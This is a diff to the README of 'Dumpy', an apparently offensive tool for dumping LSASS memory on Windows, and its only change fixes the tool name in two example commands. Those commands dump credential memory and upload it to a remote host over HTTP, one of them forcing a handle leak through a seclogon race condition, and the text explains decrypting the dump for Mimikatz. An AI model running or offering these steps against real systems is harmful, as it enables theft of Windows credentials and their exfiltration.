@@ -41,11 +41,11 @@ Dumpy has two main actions:
 
 - **dump**: It will execute the main logic to dump the lsass content. By default, it will store the result in a xored text file with a random name in the current directory. The option **upload** allows to send the memory content over HTTP to a remote host, avoiding the creation of the xored file on disk. I've used [this simple HTTP server](https://gist.github.com/smidgedy/1986e52bb33af829383eb858cb38775c) in order to handle the upload, but any other HTTP server that supports **multipart/form-data requests** will work.
 
-		C:\Temp> dympy.exe dump -k secretKey -u http://remotehost/upload
+		C:\Temp> dumpy.exe dump -k secretKey -u http://remotehost/upload
 
 If you want to force the leakage of a handle to the lsass through the race condition in seclogon's service described by [Antonio Cocomazzi](https://twitter.com/splinter_code) in [this post](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html), just use the option **force**:
 		
-		C:\Temp> dympy.exe dump -k secretKey -u http://remotehost/upload force
+		C:\Temp> dumpy.exe dump -k secretKey -u http://remotehost/upload force
 
 - **decrypt**: This action allows to obtain the decrypted memory dump in the same format that tools like Mimikatz would expect. As arguments it expects the xored memory dump, the encryption key and the output file path. In case the xored file has been uploaded using HTTP, **it is required to perform a base64 decoding of the content before this decryption process**.
 
